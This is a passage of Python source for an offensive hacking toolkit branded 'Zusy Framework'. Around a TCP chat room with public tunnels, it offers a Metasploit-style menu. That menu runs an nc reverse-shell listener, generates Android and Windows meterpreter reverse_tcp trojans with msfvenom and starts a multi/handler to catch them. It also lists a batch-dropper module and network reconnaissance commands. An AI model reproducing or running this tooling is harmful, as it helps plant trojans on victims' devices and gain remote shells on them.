    except Exception:
        pass

    join_line = _fmt_sys(f"{username} joined the chat", "join")
    _chat_broadcast(join_line, exclude_conn=conn)
    _chat_local_print(join_line)

    # 4) Message loop
    buf = b""
    try:
        while _chat_active:
            try:
                data = conn.recv(1024)
            except Exception:
                break
            if not data:
                break
            buf += data
            while b"\n" in buf:
                line, buf = buf.split(b"\n", 1)
                text = line.decode("utf-8", errors="replace").rstrip("\r")
                if not text:
                    continue
                # Protocol command from a client (e.g. /userlist) — handle privately
                if text.startswith(_CHAT_CTRL):
                    cmd = text[len(_CHAT_CTRL):].strip().lower()
                    if cmd == "userlist":
                        try:
                            conn.sendall((_chat_userlist_text() + "\n").encode())
                        except Exception:
                            pass
                    continue
                out = _fmt_msg(username, color, text)
                _chat_broadcast(out, exclude_conn=conn)
                _chat_local_print(out)
    finally:
        # 5) Departure (reason set by /kick or /ban)
        with _chat_clients_lock:
            info   = _chat_clients.pop(conn, None)
            reason = info.get("leave_reason") if info else None
        try:
            conn.close()
        except Exception:
            pass
        if reason == "kick":
            leave_line = _fmt_sys(f"{username} was kicked by the admin", "leave")
        elif reason == "ban":
            leave_line = _fmt_sys(f"{username} was banned by the admin", "leave")
        else:
            leave_line = _fmt_sys(f"{username} left the chat", "leave")
        _chat_broadcast(leave_line)
        _chat_local_print(leave_line)


# ── Tunnel helper: bore.pub (no account, no card, raw TCP) ───────────────────

def _start_bore_tunnel(local_port: int):
    """
    Launch `bore local <port> --to bore.pub` and parse the assigned public
    address. Returns (public_addr, proc) on success, else (None, None).
    Requires the `bore` binary on PATH (cargo install bore-cli / brew install bore
    / prebuilt binary from https://github.com/ekzhang/bore/releases).
    """
    if shutil.which("bore") is None:
        warn("`bore` is not installed. Install it with one of:")
        info("  • [bold cyan]cargo install bore-cli[/]   (needs Rust)")
        info("  • [bold cyan]brew install bore[/]          (macOS)")
        info("  • prebuilt binary: [bold cyan underline]https://github.com/ekzhang/bore/releases[/]")
        return None, None

    try:
        proc = subprocess.Popen(
            ["bore", "local", str(local_port), "--to", "bore.pub"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except Exception as e:
        warn(f"Could not launch bore: {e}")
        return None, None

    # Read output for a few seconds until we see "bore.pub:<port>"
    public_addr = None
    deadline = time.time() + 12
    pattern  = re.compile(r"bore\.pub:(\d+)")
    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                break
            continue
        m = pattern.search(line)
        if m:
            public_addr = f"bore.pub:{m.group(1)}"
            break

    if not public_addr:
        try:
            proc.terminate()
        except Exception:
            pass
        warn("bore did not return a public address in time.")
        return None, None

    # Keep draining bore's output in the background so its pipe never blocks
    def _drain():
        try:
            for _ in proc.stdout:
                pass
        except Exception:
            pass
    threading.Thread(target=_drain, daemon=True).start()

    return public_addr, proc


# ── Server: accept loop ──────────────────────────────────────────────────────

def _chat_accept_loop(server_sock: socket.socket) -> None:
    global _chat_active
    server_sock.settimeout(1.0)
    while _chat_active:
        try:
            conn, addr = server_sock.accept()
            t = threading.Thread(
                target=_chat_handle_client, args=(conn, addr), daemon=True
            )
            t.start()
        except socket.timeout:
            continue
        except Exception:
            break


# ── PUBLIC: open a chat room (server + ngrok) ────────────────────────────────

def chat_create() -> None:
    global _chat_active, _chat_clients, _chat_term, _chat_host_username
    global _chat_server_sock, _chat_bans, _chat_seen, _chat_room_name, _chat_bore_proc

    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]FSOCIETY CHAT ROOM — SERVER[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()

    # ── Ask for the room / group name ─────────────────────────────────────────
    console.print(
        "  [bold red]Chat / group name[/] [dim](Enter = ZUSY)[/] : ", end=""
    )
    room_in = input().strip()
    _chat_room_name = room_in or "ZUSY"
    console.print()

    # ── Ask for the port ──────────────────────────────────────────────────────
    console.print(
        f"  [bold red]Listening port[/] [dim](Enter = {CHAT_PORT})[/] : ", end=""
    )
    port_in = input().strip()
    chat_port = int(port_in) if port_in.isdigit() else CHAT_PORT

    # ── Choose how to expose the room ─────────────────────────────────────────
    console.print()
    info("How do you want to host the room?")
    console.print("    [bold bright_green]1[/]) bore.pub        [dim]— public, no account, no card (one small binary)[/]")
    console.print("    [bold bright_green]2[/]) ngrok           [dim]— public, needs token + a card on file for TCP[/]")
    console.print("    [bold bright_green]3[/]) LAN only        [dim]— same Wi-Fi / network, no internet[/]")
    console.print("    [bold bright_green]4[/]) Port forwarding [dim]— public, NO install (uses your router)[/]")
    console.print()
    console.print("  [bold red]Choice[/] [dim](Enter = 1)[/] : ", end="")
    tunnel_choice = input().strip() or "1"

    ngrok_token = ""
    if tunnel_choice == "2":
        console.print()
        info("Free token: [bold cyan underline]https://dashboard.ngrok.com/get-started/your-authtoken[/]")
        warn("ngrok now requires a card on file to open TCP tunnels (not charged).")
        console.print("  [bold red]ngrok authtoken[/] : ", end="")
        ngrok_token = input().strip()

    # ── Start the TCP server ──────────────────────────────────────────────────
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_sock.bind(("0.0.0.0", chat_port))
        server_sock.listen(20)
    except Exception as e:
        err(f"Could not bind port: {e}")
        server_sock.close()
        return

    ok_line(f"TCP listening  →  [bold cyan]0.0.0.0:{chat_port}[/]")
    _chat_server_sock = server_sock

    # ── Open the chosen tunnel ────────────────────────────────────────────────
    public_addr      = None
    _chat_bore_proc  = None

    if tunnel_choice == "1":
        info("Starting bore.pub tunnel …")
        public_addr, _chat_bore_proc = _start_bore_tunnel(chat_port)
        if public_addr:
            ok(f"bore tunnel active  →  [bold bright_green]{public_addr}[/]")
        else:
            public_addr = f"{get_local_ip()}:{chat_port}"
            warn(f"Falling back to LAN: [bold cyan]{public_addr}[/]")

    elif tunnel_choice == "2" and ngrok_token:
        try:
            from pyngrok import ngrok as _ngrok, conf as _ngrok_conf
            _ngrok_conf.get_default().auth_token = ngrok_token
            tunnel      = _ngrok.connect(chat_port, "tcp")
            public_addr = tunnel.public_url.replace("tcp://", "")
            ok(f"ngrok tunnel active  →  [bold bright_green]{public_addr}[/]")
        except Exception as e:
            warn(f"ngrok failed to start: {e}")
            public_addr = f"{get_local_ip()}:{chat_port}"
            warn(f"Falling back to LAN: [bold cyan]{public_addr}[/]")

    elif tunnel_choice == "4":
        info("Fetching your public IP …")
        pub_ip = get_public_ip()
        if pub_ip:
            public_addr = f"{pub_ip}:{chat_port}"
            ok(f"Public IP  →  [bold bright_green]{public_addr}[/]")
            console.print()
            warn("Port forwarding needs ONE manual step on your router:")
            info(f"  1) Open your router admin page (often [bold cyan]192.168.1.1[/] or [bold cyan]192.168.0.1[/]).")
            info(f"  2) Find [bold]Port Forwarding / Virtual Server[/].")
            info(f"  3) Forward external TCP port [bold]{chat_port}[/] -> "
                 f"internal [bold]{get_local_ip()}:{chat_port}[/].")
            info("  4) Save. Friends then use the address above.")
            console.print()
            warn("If your ISP uses CGNAT, port forwarding won't work — use bore (1) instead.")
        else:
            public_addr = f"{get_local_ip()}:{chat_port}"
            warn(f"Could not fetch public IP. LAN only: [bold cyan]{public_addr}[/]")

    else:
        public_addr = f"{get_local_ip()}:{chat_port}"
        warn(f"LAN only: [bold cyan]{public_addr}[/]")

    # ── Connection info box ───────────────────────────────────────────────────
    console.print()
    info_panel = Text()
    info_panel.append("\n  Your friends can join with this address:\n\n", style="dim white")
    info_panel.append(f"    chat join {public_addr}\n\n", style="bold bright_green")
    info_panel.append("  Press  ", style="dim white")
    info_panel.append("Ctrl+C", style="bold yellow")
    info_panel.append("  to close the room.\n", style="dim white")
    console.print(Panel(
        info_panel,
        title="[bold red]  CONNECTION INFO  [/]",
        border_style="red",
        padding=(0, 1),
    ))
    console.print()

    # ── Accept thread ─────────────────────────────────────────────────────────
    _chat_active  = True
    _chat_clients = {}
    _chat_bans    = set()
    _chat_seen    = {}
    accept_thread = threading.Thread(
        target=_chat_accept_loop, args=(server_sock,), daemon=True
    )
    accept_thread.start()

    wait("Waiting for connections … [dim](Ctrl+C to close)[/]")
    console.print()

    # ── Host also chats ───────────────────────────────────────────────────────
    console.print(f"  [bold red]Your username in {_chat_room_name}[/] : ", end="")
    host_username = input().strip() or "HOST"
    _chat_host_username = host_username
    console.print()
    info(f"You joined [bold white]{_chat_room_name}[/] as [bold red]{host_username}[/] [dim](admin)[/]. "
         f"Type [bold cyan]/help[/] or [bold cyan]?[/] for commands.")
    console.print()

    _chat_broadcast(_fmt_sys(f"{host_username} opened {_chat_room_name}", "join"))

    original_sigint = signal.getsignal(signal.SIGINT)

    def _host_exit(sig, frame):
        raise KeyboardInterrupt

    signal.signal(signal.SIGINT, _host_exit)

    prompt = f"  \033[1;{_HOST_COLOR}m{host_username} ›\033[0m "
    term   = _make_terminal(prompt, should_stop=lambda: not _chat_active)
    _chat_term = term
    term.start()

    try:
        while _chat_active:
            text = term.read_line()
            if text is None:
                break
            text = text.strip()
            if not text:
                continue

            # ── In-chat commands (admin) — run locally, never broadcast ──────
            if _is_command(text):
                parts = text[1:].split() if text.startswith("/") else []
                cmd   = parts[0].lower() if parts else ("help" if text == "?" else "")
                args  = parts[1:]

                if cmd in ("help",) or text == "?":
                    term.print_message(_chat_help_text(is_admin=True))
                elif cmd == "clear":
                    term.clear_screen()
                elif cmd == "userlist":
                    term.print_message(_chat_userlist_text())
                elif cmd == "kick":
                    if not args:
                        term.print_message("\033[91m  Usage: /kick <user>\033[0m")
                    else:
                        term.print_message(_chat_kick(args[0], ban=False))
                elif cmd == "ban":
                    if not args:
                        term.print_message("\033[91m  Usage: /ban <user>\033[0m")
                    else:
                        term.print_message(_chat_kick(args[0], ban=True))
                elif cmd == "unban":
                    if not args:
                        term.print_message("\033[91m  Usage: /unban <ip|user>\033[0m")
                    else:
                        term.print_message(_chat_unban(args[0]))
                elif cmd == "banlist":
                    term.print_message(_chat_banlist_text())
                elif cmd == "shutdown":
                    term.print_message("\033[1;91m  Shutting down the room …\033[0m")
                    break
                else:
                    term.print_message(f"\033[91m  Unknown command '/{cmd}'. Type /help.\033[0m")
                continue

            out = _fmt_msg(host_username, _HOST_COLOR, text)
            _chat_broadcast(out)
            term.print_message(out)
    except KeyboardInterrupt:
        pass
    finally:
        term.stop()
        _chat_term   = None
        _chat_active = False
        # Force-disconnect every client (e.g. on /shutdown or Ctrl+C)
        _chat_broadcast("\033[1;91m  The room is closing. You will be disconnected.\033[0m")
        with _chat_clients_lock:
            for c in list(_chat_clients.keys()):
                try:
                    c.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    c.close()
                except Exception:
                    pass
            _chat_clients.clear()
        _chat_broadcast(_fmt_sys(f"{host_username} closed {_chat_room_name}", "leave"))
        console.print()
        warn("Closing the chat room …")
        accept_thread.join(timeout=2)
        try:
            server_sock.close()
        except Exception:
            pass
        _chat_server_sock = None
        if _chat_bore_proc is not None:
            try:
                _chat_bore_proc.terminate()
            except Exception:
                pass
            _chat_bore_proc = None
        try:
            from pyngrok import ngrok as _ngrok
            _ngrok.kill()
        except Exception:
            pass
        signal.signal(signal.SIGINT, original_sigint)
        console.print()
        ok("Chat room closed.")
        console.print()


# ── PUBLIC: join a chat room (client) ────────────────────────────────────────

def chat_join(host_port: str) -> None:
    """
    host_port  →  "X.tcp.ngrok.io:12345"  or  "192.168.1.5:9999"
    """
    global _chat_term

    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]FSOCIETY CHAT ROOM — CLIENT[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()

    # Parse host:port
    try:
        if ":" in host_port:
            parts = host_port.rsplit(":", 1)
            host  = parts[0]
            port  = int(parts[1])
        else:
            host = host_port
            port = CHAT_PORT
    except Exception:
        err("Invalid address. Example: [bold cyan]chat join 1.tcp.ngrok.io:12345[/]")
        return

    info(f"Connecting  →  [bold cyan]{host}:{port}[/] …")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        sock.connect((host, port))
        sock.settimeout(None)
    except Exception as e:
        err(f"Could not connect: {e}")
        return

    ok(f"Connected to [bold bright_green]{host}:{port}[/]!")
    console.print()

    # ── Read the server's first message BEFORE asking for a name ──────────────
    # The server sends either a ban marker (and closes) or the username prompt.
    try:
        sock.settimeout(5)
        greeting = sock.recv(256).decode("utf-8", errors="replace")
        sock.settimeout(None)
    except Exception:
        greeting = ""
        sock.settimeout(None)

    if greeting.startswith(_CHAT_CTRL + "BAN"):
        ban_msg = greeting[len(_CHAT_CTRL) + 3:].strip()
        console.print()
        err(ban_msg or "You have been banned from this room.")
        console.print()
        try:
            sock.close()
        except Exception:
            pass
        return

    # ── Username (asked locally for a clean UX, then sent to the server) ──────
    console.print("  [bold red]Your username[/] : ", end="")
    username = input().strip() or f"Guest_{port}"
    console.print()

    # Server prompt was already consumed above; just send our name
    try:
        sock.sendall((username + "\n").encode("utf-8"))
    except Exception as e:
        err(f"Could not send username: {e}")
        sock.close()
        return

    info(
        f"Joined as [bold white]{username}[/]. "
        "Type [bold cyan]/help[/] or [bold cyan]?[/] for commands, [bold yellow]Ctrl+C[/] to leave."
    )
    console.print()

    _client_active = threading.Event()
    _client_active.set()

    prompt = f"  \033[1;{_CLIENT_ECHO}m{username} ›\033[0m "
    term   = _make_terminal(prompt, should_stop=lambda: not _client_active.is_set())
    _chat_term = term

    # ── Receive incoming messages in the background ───────────────────────────
    def _recv_loop():
        buf = b""
        try:
            while _client_active.is_set():
                try:
                    data = sock.recv(1024)
                except Exception:
                    break
                if not data:
                    break
                buf += data
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    text = line.decode("utf-8", errors="replace").rstrip("\r")
                    if text:
                        term.print_message(text)   # already ANSI-formatted server-side
        except Exception:
            pass
        finally:
            _client_active.clear()

    recv_thread = threading.Thread(target=_recv_loop, daemon=True)
    recv_thread.start()

    # ── Send loop ─────────────────────────────────────────────────────────────
    original_sigint = signal.getsignal(signal.SIGINT)

    def _client_exit(sig, frame):
        raise KeyboardInterrupt

    signal.signal(signal.SIGINT, _client_exit)

    term.start()
    try:
        while _client_active.is_set():
            text = term.read_line()
            if text is None:
                break
            text = text.strip()
            if not text:
                continue

            # ── In-chat commands — run locally, never sent as a message ──────
            if _is_command(text):
                parts = text[1:].split() if text.startswith("/") else []
                cmd   = parts[0].lower() if parts else ("help" if text == "?" else "")

                if cmd in ("help",) or text == "?":
                    term.print_message(_chat_help_text(is_admin=False))
                elif cmd == "clear":
                    term.clear_screen()
                elif cmd == "userlist":
                    # ask the server privately; it replies just to us
                    try:
                        sock.sendall((_CHAT_CTRL + "userlist\n").encode("utf-8"))
                    except Exception:
                        err("Connection lost.")
                        break
                else:
                    term.print_message(f"\033[91m  Unknown command '/{cmd}'. Type /help.\033[0m")
                continue

            try:
                sock.sendall((text + "\n").encode("utf-8"))
            except Exception:
                err("Connection lost.")
                break
            # Echo our own message locally (server excludes the sender)
            term.print_message(_fmt_msg(username, _CLIENT_ECHO, text))
    except KeyboardInterrupt:
        pass
    finally:
        _client_active.clear()
        term.stop()
        _chat_term = None
        signal.signal(signal.SIGINT, original_sigint)
        try:
            sock.close()
        except Exception:
            pass
        console.print()
        warn(f"{username} left the chat.")
        console.print()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN MENU
# ─────────────────────────────────────────────────────────────────────────────

def menu():
    current_exploit = ""
    lhost = local_ip
    lport = "8000"
    cmd_history = []

    loading_animation("Initializing Zusy Framework — stand by", duration=3)
    time.sleep(2)
    console.print()
    print_random_element()

    console.print()
    console.rule(style="red", characters="═")
    console.print(
        f"  [bold red]ZUSY FRAMEWORK[/]  [dim red]│[/]"
        f"  [dim white]Session[/] [bold white]{time.strftime('%Y-%m-%d  %H:%M:%S')}[/]"
        f"  [dim red]│[/]  [dim white]LHOST[/] [bold cyan]{lhost}[/]"
        f"  [dim red]│[/]  [dim white]User[/] [bold white]{os.getenv('USER', 'root')}[/]"
    )
    console.rule(style="red", characters="═")
    console.print()
    console.print(
        "  Type [bold cyan]help[/] or [bold cyan]?[/] for the command reference."
        "  Type [bold cyan]exit[/] to terminate.\n"
    )
    time.sleep(1.1)

    while True:
        if current_exploit:
            short = current_exploit.split("/")[-1].upper()
            prompt_str = (
                f"\n[dim red]╔══[/][bold red]([/][bold cyan]zusy[/][dim red]@[/][bold yellow]fsociety[/][bold red])[/]"
                f"[dim red]──[/][bold red]([/][bold cyan]{short}[/][bold red])[/]\n"
                f"[dim red]╚═▶[/] "
            )
        else:
            prompt_str = (
                f"\n[dim red]╔══[/][bold red]([/][bold cyan]zusy[/][dim red]@[/][bold yellow]fsociety[/][bold red])[/]"
                f"[dim red]──[/][bold red]([/][dim white]no module[/][bold red])[/]\n"
                f"[dim red]╚═▶[/] "
            )

        try:
            console.print(prompt_str, end="")
            user_input = input()
        except KeyboardInterrupt:
            continue

        if user_input.strip() and user_input.strip() not in ('history',):
            cmd_history.append(user_input.strip())

        # ── Help ──────────────────────────────────────────────────────────────
        if user_input in ['?', 'help']:
            print_help(current_exploit)
            continue

        # ── Info ──────────────────────────────────────────────────────────────
        if user_input == 'info':
            print_info()
            continue

        # ── CHAT ROOM ─────────────────────────────────────────────────────────
        if user_input.strip() == "chat create":
            chat_create()
            continue

        chat_join_m = re.match(r'chat\s+join\s+(\S+)', user_input.strip())
        if chat_join_m:
            chat_join(chat_join_m.group(1))
            continue

        # ── Use / exploit selection ───────────────────────────────────────────
        if re.match(
            r'use\s+(exploit/windows/reverseshell'
            r'|exploit/meterpreter/reverse_tcp'
            r'|exploit/windows/batdropper)',
            user_input
        ):
            current_exploit = user_input.split()[-1]
            print_exploit_selected(current_exploit)

        if current_exploit == 'exploit/meterpreter/reverse_tcp':
            create_trojan()
            continue

        # ── BAT DROPPER ───────────────────────────────────────────────────────
        if current_exploit == 'exploit/windows/batdropper':
            if user_input in ('exploit', 'run') or re.match(
                r'use\s+exploit/windows/batdropper', user_input
            ):
                create_bat_dropper(lhost, lport)
            continue

        # ── exit_module ───────────────────────────────────────────────────────
        if user_input == 'exit_module':
            if current_exploit:
                console.print()
                info(f"Unloaded module  [dim red]→[/]  [dim]{current_exploit}[/]")
                console.print()
                current_exploit = ""
            else:
                console.print()
                warn("No active module to unload.")
                console.print()
            continue

        # ── set LPORT ─────────────────────────────────────────────────────────
        set_lport = re.match(r'set\s+LPORT\s+(\S+)', user_input, re.IGNORECASE)
        if set_lport:
            if current_exploit:
                lport = set_lport.group(1)
                console.print()
                ok_line(f"LPORT set  [dim red]→[/]  [bold cyan]{lport}[/]")
                console.print()
            else:
                console.print()
                warn("No module selected. Use [bold cyan]use <exploit>[/] first.")
                console.print()
            continue

        # ── Options ───────────────────────────────────────────────────────────
        if user_input == 'options':
            if current_exploit:
                print_options(lhost, lport)
            else:
                console.print()
                warn("No module selected. Use [bold cyan]use <exploit>[/] first.")
                console.print()
            continue

        # ── Exploit / run ─────────────────────────────────────────────────────
        if user_input == 'exploit':
            if current_exploit == 'exploit/windows/reverseshell':
                reverseshell(lhost, lport)
            continue

        if user_input == 'run':
            if current_exploit == 'exploit/windows/reverseshell':
                reverseshell(lhost, lport)
            continue

        # ── Exit ──────────────────────────────────────────────────────────────
        if user_input == 'exit':
            console.print()
            console.rule(style="red", characters="═")
            console.print(
                f"  [bold red]SESSION TERMINATED[/]  [dim red]│[/]"
                f"  [dim white]{time.strftime('%Y-%m-%d  %H:%M:%S')}[/]"
            )
            console.rule(style="red", characters="═")
            console.print()
            break

        # ── ifconfig ──────────────────────────────────────────────────────────
        if user_input == 'ifconfig':
            console.print()
            console.rule(
                "  [bold red]◈[/]  [bold white]NETWORK INTERFACES[/]  [bold red]◈[/]",
                style="red", characters="═",
            )
            console.print()
            table = Table(
                box=box.HEAVY_HEAD, border_style="dim red",
                header_style="bold red on black", show_header=True,
                min_width=50, padding=(0, 2),
            )
            table.add_column("INTERFACE",  style="bold cyan",         width=18)
            table.add_column("ADDRESS",    style="bold bright_green", width=22)
            table.add_column("STATUS",     style="bold green",        width=10)
            table.add_row("local", local_ip, "UP")
            console.print(table)
            console.print()
            console.rule(style="dim red", characters="─")
            console.print()

        # ── help_reverseshell ─────────────────────────────────────────────────
        if user_input == 'help_reverseshell':
            print_shellcommand(lhost)

        # ── clear ─────────────────────────────────────────────────────────────
        if user_input == "clear":
            os.system('clear')

        # ── portscan ──────────────────────────────────────────────────────────
        ps_match = re.match(r'portscan\s+(\S+)', user_input)
        if ps_match:
            cmd_portscan(ps_match.group(1))

        # ── dnslookup ─────────────────────────────────────────────────────────
        dns_match = re.match(r'dnslookup\s+(\S+)', user_input)
        if dns_match:
            cmd_dnslookup(dns_match.group(1))

        # ── sysinfo ───────────────────────────────────────────────────────────
        if user_input == 'sysinfo':
            cmd_sysinfo()

        # ── base64 ────────────────────────────────────────────────────────────
        b64_match = re.match(r'base64\s+(encode|decode)\s+(.+)', user_input)
        if b64_match:
            cmd_base64(b64_match.group(1), b64_match.group(2))

        # ── hashgen ───────────────────────────────────────────────────────────
        hash_match = re.match(r'hashgen\s+(.+)', user_input)
        if hash_match:
            cmd_hashgen(hash_match.group(1))

        # ── netstat ───────────────────────────────────────────────────────────
        if user_input == 'netstat':
            cmd_netstat()

        # ── ping ──────────────────────────────────────────────────────────────
        ping_m = re.match(r'ping\s+(\S+)', user_input)
        if ping_m:
            cmd_ping(ping_m.group(1))

        # ── traceroute ────────────────────────────────────────────────────────
        tr_m = re.match(r'traceroute\s+(\S+)', user_input)
        if tr_m:
            cmd_traceroute(tr_m.group(1))

        # ── macvendor ─────────────────────────────────────────────────────────
        mac_m = re.match(r'macvendor\s+(\S+)', user_input)
        if mac_m:
            cmd_macvendor(mac_m.group(1))

        # ── rot13 ─────────────────────────────────────────────────────────────
        rot_m = re.match(r'rot13\s+(.+)', user_input)
        if rot_m:
            cmd_rot13(rot_m.group(1))

        # ── hexencode ─────────────────────────────────────────────────────────
        hexe_m = re.match(r'hexencode\s+(.+)', user_input)
        if hexe_m:
            cmd_hexencode(hexe_m.group(1))

        # ── hexdecode ─────────────────────────────────────────────────────────
        hexd_m = re.match(r'hexdecode\s+(\S+)', user_input)
        if hexd_m:
            cmd_hexdecode(hexd_m.group(1))

        # ── urlencode ─────────────────────────────────────────────────────────
        url_m = re.match(r'urlencode\s+(.+)', user_input)
        if url_m:
            cmd_urlencode(url_m.group(1))

        # ── uptime ────────────────────────────────────────────────────────────
        if user_input == 'uptime':
            cmd_uptime()

        # ── diskinfo ──────────────────────────────────────────────────────────
        if user_input == 'diskinfo':
            cmd_diskinfo()

        # ── history ───────────────────────────────────────────────────────────
        if user_input == 'history':
            section("COMMAND HISTORY")
            if not cmd_history:
                warn("No commands in history yet.")
            else:
                table = Table(
                    box=box.SIMPLE, border_style="dim red",
                    show_header=False, min_width=60, padding=(0, 2),
                )
                table.add_column("n",   style="bold red",  width=5)
                table.add_column("cmd", style="bold cyan", width=55)
                for i, h in enumerate(cmd_history, 1):
                    table.add_row(str(i), h)
                console.print(table)
            console.print()

        # ── set (show all settings) ───────────────────────────────────────────
        if user_input == 'set':
            section("CURRENT SETTINGS")
            table = Table(
                box=box.HEAVY_HEAD, border_style="dim red",
                header_style="bold red on black", show_header=True,
                min_width=60, padding=(0, 2),
            )
            table.add_column("PARAMETER", style="bold cyan",         width=16)
            table.add_column("VALUE",     style="bold bright_green", width=40)
            table.add_row("LHOST",  lhost)
            table.add_row("LPORT",  lport)
            table.add_row("MODULE", current_exploit if current_exploit else "[dim]none[/]")
            console.print(table)
            console.print()

        # ── banner ────────────────────────────────────────────────────────────
        banner_m = re.match(r'banner\s+(\S+)\s+(\S+)', user_input)
        if banner_m:
            cmd_banner(banner_m.group(1), banner_m.group(2))

        # ── subdomains ────────────────────────────────────────────────────────
        sub_m = re.match(r'subdomains\s+(\S+)', user_input)
        if sub_m:
            cmd_subdomains(sub_m.group(1))

        # ── httpheaders ───────────────────────────────────────────────────────
        hdr_m = re.match(r'httpheaders\s+(\S+)', user_input)
        if hdr_m:
            cmd_httpheaders(hdr_m.group(1))

        # ── sweep ─────────────────────────────────────────────────────────────
        sweep_m = re.match(r'sweep\s+(\S+)', user_input)
        if sweep_m:
            cmd_sweep(sweep_m.group(1))

        # ── portrange ─────────────────────────────────────────────────────────
        pr_m = re.match(r'portrange\s+(\S+)\s+(\S+)\s+(\S+)', user_input)
        if pr_m:
            cmd_portrange(pr_m.group(1), pr_m.group(2), pr_m.group(3))

        # ── arplist ───────────────────────────────────────────────────────────
        if user_input == 'arplist':
            cmd_arplist()

        # ── openports ─────────────────────────────────────────────────────────
        if user_input == 'openports':
            cmd_openports()


# ─────────────────────────────────────────────────────────────────────────────
# REVERSE SHELL
# ─────────────────────────────────────────────────────────────────────────────

def reverseshell(lhost, lport):
    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]REVERSE SHELL — DEPLOYING[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()
    time.sleep(1)

    with Progress(
        SpinnerColumn(spinner_name="dots2", style="bold red"),
        TextColumn("  [bold white]{task.description}[/]"),
        BarColumn(bar_width=30, style="red", complete_style="bright_green"),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as progress:
        t = progress.add_task(f"Binding listener on {lhost}:{lport}", total=100)
        for _ in range(50):
            progress.advance(t, 2)
            time.sleep(0.1)

    ok_line(f"Listener bound  →  [bold cyan]{lhost}:{lport}[/]")
    time.sleep(2)

    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold bright_green]AWAITING INBOUND CONNECTION[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()
    wait(
        f"Standing by on [bold cyan]{lhost}:{lport}[/] — "
        "shell will spawn on victim callback …"
    )
    console.print()

    global _listener_running
    _listener_running = True
    with open("reverseshell.sh", "w") as f:
        f.write(f"while true; do nc -l -p 8000 2> /root/error.txt ; done")
    try:
        subprocess.run(["bash", "reverseshell.sh"])
    except SystemExit:
        pass
    finally:
        _listener_running = False


# ─────────────────────────────────────────────────────────────────────────────
# TROJAN CREATOR
# ─────────────────────────────────────────────────────────────────────────────

def create_trojan():
    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]PAYLOAD GENERATOR — msfvenom[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()

    console.print("  [bold white]Select target platform:[/]\n")
    pt = Table(
        box=box.SIMPLE_HEAVY, show_header=True,
        header_style="bold red", border_style="dim red",
        padding=(0, 3), min_width=50,
    )
    pt.add_column("#",        style="bold red",  width=4)
    pt.add_column("PLATFORM", style="bold cyan", width=12)
    pt.add_column("OUTPUT",   style="dim white", width=20)
    pt.add_column("PAYLOAD",  style="dim white", width=28)
    pt.add_row("1", "Android", ".apk", "android/meterpreter/reverse_tcp")
    pt.add_row("2", "Windows", ".exe", "windows/meterpreter/reverse_tcp")
    console.print(pt)
    console.print()

    console.print(
        "  [dim red]╔══[/][bold red]([/][bold white]zusy[/][bold red])[/]"
        "[dim red]──[/][bold red]([/][bold cyan]PAYLOAD BUILDER[/][bold red])[/]\n"
        "  [dim red]╚═▶[/] ",
        end="",
    )
    platform_choice = input()

    _platform = ""
    file_extension = ""

    if platform_choice == "1":
        _platform = "android"
        file_extension = "apk"
    elif platform_choice == "2":
        _platform = "windows"
        file_extension = "exe"
    else:
        err("Invalid choice — expected [bold cyan]1[/] or [bold cyan]2[/].")
        create_trojan()

    section("PAYLOAD CONFIGURATION")

    console.print("  [bold red]LHOST[/] [dim](leave blank to auto-detect)[/] : ", end="")
    lhost = input()
    if not lhost:
        lhost = get_local_ip()
        if not lhost:
            err("Failed to detect local IP address.")
            input("\n  Press Enter to return to menu …")
            menu()

    console.print("  [bold red]LPORT[/]                              : ", end="")
    lport = input()

    console.print("  [bold red]Output filename[/] [dim](no extension)[/]  : ", end="")
    filedirectory = input()

    trojan_command = (
        f"msfvenom -p {_platform}/meterpreter/reverse_tcp "
        f"LHOST={lhost} LPORT={lport} -o {filedirectory}.{file_extension}"
    )

    console.print()
    info(f"Generating [bold white]{_platform}[/] payload → [bold cyan]{filedirectory}.{file_extension}[/]")
    console.print()

    with Progress(
        SpinnerColumn(spinner_name="dots2", style="bold red"),
        TextColumn("  [bold white]{task.description}[/]"),
        BarColumn(bar_width=34, style="red", complete_style="bright_green"),
        TimeElapsedColumn(),
        console=console, transient=True,
    ) as progress:
        t = progress.add_task("Invoking msfvenom …", total=None)
        process = subprocess.run(trojan_command, shell=True)

    if process.returncode == 0:
        ok(f"Payload written  →  [bold cyan]{os.getcwd()}/{filedirectory}.{file_extension}[/]")
        console.print()
        info("Launching [bold white]multi/handler[/] in msfconsole …")
        console.print()
        console.rule(style="dim red", characters="─")
        msf_command = (
            f"use exploit/multi/handler; "
            f"set payload {_platform}/meterpreter/reverse_tcp; "
            f"set LHOST 0.0.0.0; set LPORT 4242; exploit"
        )
        subprocess.run(f"msfconsole -q -x '{msf_command}'", shell=True)
    else:
        err("Payload generation failed — verify msfvenom is installed and parameters are valid.")
        console.print()


# ─────────────────────────────────────────────────────────────────────────────
# UTILITY MODULES  (orijinal koddan değiştirilmeden)
# ─────────────────────────────────────────────────────────────────────────────

def cmd_portscan(target: str) -> None:
    section(f"PORT SCANNER  ─  {target}")
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS",
        143: "IMAP", 443: "HTTPS", 445: "SMB", 3306: "MySQL",
        3389: "RDP", 5900: "VNC", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    }
    open_ports = []

    with Progress(
